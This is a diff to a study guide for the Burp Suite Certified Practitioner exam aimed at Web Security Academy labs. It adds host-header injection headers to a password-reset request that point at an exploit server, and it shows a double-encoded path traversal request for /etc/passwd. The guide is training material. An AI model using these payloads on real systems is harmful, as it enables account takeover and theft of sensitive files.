@@ -17,6 +17,7 @@ The acronym BSCP has nice simular ring like OSCP  :)
 [Cross Site Request Forgery](#csrf)  
 [Brute force authentication](#brute-force-authentication)  
 [Focus target scanning](#focus-scanning)  
+[File path traversal](#file-path-traversal)  
 [Youtube Study Playlist](#youtube-training-playlist)  
 
 
@@ -1017,16 +1018,22 @@ Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
 Sec-Ch-Ua-Mobile: ?0
 Sec-Ch-Ua-Platform: "Linux"
 Upgrade-Insecure-Requests: 1
+Origin: https://TARGET.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: https://0aeb00f304106e28c6579a9f000200d6.web-security-academy.net/refreshpassword
+X-Forwarded-Host: exploit.exploit-server.net
+X-Host: exploit.exploit-server.net
+X-Forwarded-Server: exploit.exploit-server.net
+Referer: https://TARGET.web-security-academy.net/refreshpassword
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
 Connection: close
 
 csrf=TOKEN&username=administrator
-```
+```  
+
+![CSRF privesc](csrf-privesc.png)  
 
 >oAuth linking exploit server hosting iframe, then deliver to victim, forcing user to update code linked.  
 
@@ -1117,6 +1124,8 @@ grep 'Update email'
 ```html
 GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
 ```  
+
+![URL encode path traverse](encode-path-traverse.png)  
 
 >Burp Intruder provides a predefined payload list (Fuzzing - path traversal).  
 
